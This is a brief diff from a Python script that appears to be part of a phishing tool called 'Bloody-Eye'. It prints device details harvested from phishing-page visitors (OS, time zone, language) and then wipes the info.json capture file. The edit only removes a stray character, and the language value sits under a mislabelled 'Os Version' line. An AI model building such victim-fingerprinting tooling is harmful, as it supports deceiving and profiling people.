@@ -603,7 +603,7 @@ exit();""")
                     print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Os Name : "+Fore.WHITE+value['Os-Name'])
                     print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Os Version : "+Fore.WHITE+value['Os-Version'])
                     print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Time Zone : "+Fore.WHITE+value['Time-Zone'])
-                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Os Version : "+Fore.WHITE+value['Language'])                                  >
+                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Os Version : "+Fore.WHITE+value['Language'])                                  
                     a = open("../Bloody-Eye/templates/phishing/info.json","w")
                     b = a.write("")
                     a.close()
